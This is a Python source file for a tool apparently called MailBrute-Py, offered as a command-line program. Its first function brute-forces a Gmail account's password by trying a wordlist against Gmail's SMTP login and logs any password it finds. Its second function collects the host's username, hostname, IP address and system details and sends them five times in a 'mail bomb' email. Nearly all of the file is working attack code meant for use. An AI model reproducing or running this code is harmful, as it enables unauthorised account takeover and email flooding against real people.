# -*- coding: utf-8 -*-

import os 
import imghdr  
from time import sleep
import getpass
import socket
import platform
import smtplib
from email.message import EmailMessage
import sys

# github.com/vLeeH - 2021
# Disable the less secure apps in your google account to he Mail Sender.

__author__='vLeeH'
__version__='0.0.5'

clear_func = lambda:os.system('cls' if os.name == 'nt' else 'clear')

def __start__():
    '''The banner of the email tools.'''
    clear_func() 
    sleep(0.5)
    mail_banner =f'''\033[31m
      __  __      _ _   ___          _        ____                 
     |  \/  |__ _(_) | | _ )_ _ _  _| |_ ___  | __|__ _ _ __ ___ 
     | |\/| / _` | | | | _ \ '_| || |  _/ -_) | _/ _ \ '_/ _/ -_)
     |_|  |_\__,_|_|_| |___/_|  \_,_|\__\___| |_|\___/_| \__\___|
    
     Github: https://github.com/vleeh/MailBrute-Py
     By: {__author__}
     Version: {__version__}
    \033[0m'''
    print(mail_banner)
    sleep(1)


def __MailBrute__(): 
    '''Get the email password'''
    gmail = str(input("[*] Enter the email: "))
    i = 0
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        passwfile = open('packages/wordlists/wordlist.txt', 'r')
        pass_list = passwfile.readlines()
        for password in pass_list:
            i += 1
            print(f'[{str(i)}' + '/' + f'{str(len(pass_list))}]')
            try:
                server.login(gmail, password)
                sleep(1)
                print()
                print(f'\033[92;1m [+] Email: {gmail} - Password found: {password} \033[0m')
                with open('password.txt', 'at+', encoding='utf-8') as p: 
                    p.write(f'[+] Email: {gmail} - Password found: {password}\n')

                break

            except smtplib.SMTPAuthenticationError as e:
                error = str(e)
                if error[14] == '<':
                    sleep(1)
                    print()
                    print(f'\033[92;1m [+] Email: {gmail} - Password found: {password} \033[0m')
                    with open('password.txt', 'at+', encoding='utf-8') as p: 
                        p.write(f'[+] Email: {gmail} - Password found: {password}\n')

                    break

                else:
                    print(f'[!] Password not found => {password}')
                
    except Exception as ex: 
        print()
        print(f'\033[31m ![ERROR] {ex}\033[0m')

    finally: 
        sleep(1)
        print()
        print('[-] Email brute force finished!')


def __MailBomb__(send_email, rec_email, password): 
    '''Send emails with computer informations, html messages and files'''
    username = getpass.getuser()
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    inf = "{}\n{}\n\n> System.inf\n{}\n{}\n{}\n\n> Raw:\n{}".format(
        hostname,
        IPAddr,
        platform.node(),
        platform.system(),
        platform.processor(),
        platform.uname()
    )

    # Informations
    subject = f'MAIL BOMB 🤡🤡!!'
    msg = EmailMessage()
    msg['subject'] = subject
    msg['From'] = send_email
    msg['To'] = rec_email

    # HTML message :P
    msg.set_content('Image attached')
    msg.add_alternative('''
        <!DOCTYPE html>
        <html lang="en">
            <body>
                <h1 style="color: SlateGrey;">MAIL BOMB ATTACK 🤡🤡</h1>
                <h2>Computer informations</h2><br>
                {}
            </body>
        </html>
    '''.format(inf), subtype='html')

    # Send Files and Images
    files= ['demo/Clown.png']
    for file in files: 
        try: 
            with open(file, 'rb') as f: 
                file_data=f.read()
                file_type=imghdr.what(f.name)
                file_name=f.name

            msg.add_attachment(file_data, maintype='image', subtype=file_type, filename=file_name)

        except Exception as e: 
            print()
            print(f'\033[31m ![ERROR] {e}\033[0m')

    # Send the email
    try: 
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp: 
            smtp.login(send_email, password)
            print(f'[+] Login in the email {send_email}')
            sleep(1)
            for m in range(0, 5): 
                smtp.send_message(msg)
            print('\033[1;32m [+] Email has been sent to {}\033[0m'.format(rec_email))

    except Exception as e: 
        print()
        print(f'\033[31m ![ERROR] {e}\033[0m')

    finally: 
        print('[-] Email sender finished!')


def main(): 
    __start__()
    print()
    while True: 
        ask1 = str(input('[*] Do you wanna use mail tools?(y/n) ')).strip().lower()
        if ask1 == 'y':
            ask = str(
                input('[*] Bruteforce/Send? ')).lower().strip()
            if ask == 'bruteforce':
                __MailBrute__()
            elif ask == 'send':
                print()
                print('[+] Starting the Sender tool...')
                sleep(2)
                # Credentials
                # Enter the emails that will send and receive here, and in the .env file.
                send_email = 'example@gmail.com'
                rec_email = 'example@gmail.com'
                password = getpass.getpass('[*] Enter your password: ')
                __MailBomb__(send_email, rec_email, password)
            else: 
                print()
                print('[!] Invalid answer.')

        elif ask1 == 'n': 
            sleep(2)
            print()
            print(f'By: {__author__}')
            print('[+] Thanks for using this tool! ')
            break
        
        else: 
            print()
            print('[!] Invalid answer.')


if __name__=='__main__': 
    main()
